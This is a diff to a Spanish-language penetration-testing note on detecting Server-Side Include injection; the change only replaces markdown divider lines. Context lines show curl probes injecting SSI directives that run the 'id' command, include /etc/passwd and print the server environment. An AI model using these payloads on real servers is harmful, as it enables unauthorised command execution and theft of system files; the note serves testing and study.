@@ -16,7 +16,7 @@ linked:
 ---
 # SSI - Detección y Reconocimiento
 
-***
+---
 
 ## Identificar SSI Habilitado
 
@@ -38,7 +38,7 @@ linked:
 | Wayback Machine | Historical .shtml URLs | OSINT. |
 ^ssi-detect-enabled
 
-___
+---
 
 ## Probes Iniciales
 
@@ -84,7 +84,7 @@ curl -s "$TARGET?q=<!--%23exec+cmd=%22id%22+-->"
 curl -s "$TARGET?q=<!--%23include+file=%22/etc/passwd%22+-->"
 ```
 
-___
+---
 
 ## Fingerprint del Server (Recon Profundo)
 
@@ -124,4 +124,4 @@ ___
 <!--#printenv -->
 ```
 
-***
+---
